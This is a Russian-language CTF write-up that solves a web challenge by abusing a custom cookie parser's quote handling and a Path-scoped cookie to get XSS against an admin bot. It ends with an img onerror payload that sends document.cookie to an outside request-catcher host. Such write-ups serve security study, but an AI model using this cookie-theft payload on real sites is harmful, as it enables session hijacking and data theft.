...
![](https://github.com/andreika47/Quiet-CTF/blob/main/Multipassport/pics/1.png)
![](https://github.com/andreika47/Quiet-CTF/blob/main/Multipassport/pics/2.png)
![](https://github.com/andreika47/Quiet-CTF/blob/main/Multipassport/pics/3.png)

Изучив код задания можно выделить следующие интересные моменты:
Администратор взаимодействует с приложением через браузер 
Флаг содержится в HttpOnly куке администратора
Реализован кастомный парсинг заголовка с куками: 
```
function parseCookies(cookieHeader)
```
Пользователь и администратор используют разные эндпоинты для отображения HTML кода:
```
...
<body>
```
Далее, нужно обратить внимание, что при обращении к эндпоинту с нашим HTML кодом проверяется наличие сессии, соответствующей автору кода. 
```
...
```
Администратор может ходить на наш сайт, так как у него есть кука с флагом. И теперь стоит разобраться с парсингом заголовка Cookie. Самодельный парсер берет заголовок Cookie, где передаются все куки запроса и пытается разбить его на названия кук и значения. Необходимо заметить особенность обработки кук с двойными кавычками: парсер будет считать все, что окружено двойными кавычками значением куки. Тогда мы можем передать в запросе куку с открывающей двойной кавычкой, тогда все данные, указанные после нее будут распаршены как значение нашей куки:
```
...
```
Для того, чтобы наша кука SESSION была более приоритетной, чем кука администратора, необходимо чтобы у наше куки был определен параметр Path. Подробнее про это можно почитать в статье про Cookie Tossing или в отчете нашего CTF SPACE-2. Проверяем, что мы добились XSS:
```
</body>
<head>
    <meta http-equiv="refresh" content="1; url=/public/site/{{site.id}}">
...
<body>
  ...
  <img src="x" onerror='var xhr = new XMLHttpRequest();xhr.open("GET", "https://1234.requestcatcher.com/leak?token=" + encodeURIComponent(document.cookie), false);xhr.send();'>
```
![](https://github.com/andreika47/Quiet-CTF/blob/main/Multipassport/pics/4.png)
